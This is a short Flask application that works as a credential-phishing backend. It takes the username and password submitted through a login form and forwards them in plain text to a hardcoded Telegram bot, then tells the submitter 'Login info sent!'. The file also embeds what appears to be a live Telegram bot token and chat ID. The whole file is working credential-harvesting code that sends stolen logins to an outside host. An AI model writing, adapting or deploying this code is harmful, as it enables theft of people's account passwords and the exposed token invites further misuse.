from flask import Flask, render_template, request
import requests

app = Flask(__name__)
bot_token = "8273890387:AAG8BbidwS-UkY_Ct-bdmbFbHq6xr_qdBqM"
chat_id = "6291023089"

@app.route('/', methods=['GET', 'POST'])  # <-- allow POST
def home():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        # Send to Telegram
        message = f"Login attempt:\nUsername: {username}\nPassword: {password}"
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={message}"
        requests.get(url)
        
        return "Login info sent!"  # or redirect to a success page
    
    # GET request
    return render_template('index.html')

if __name__ == "__main__":
    app.run(debug=True, port=10000)
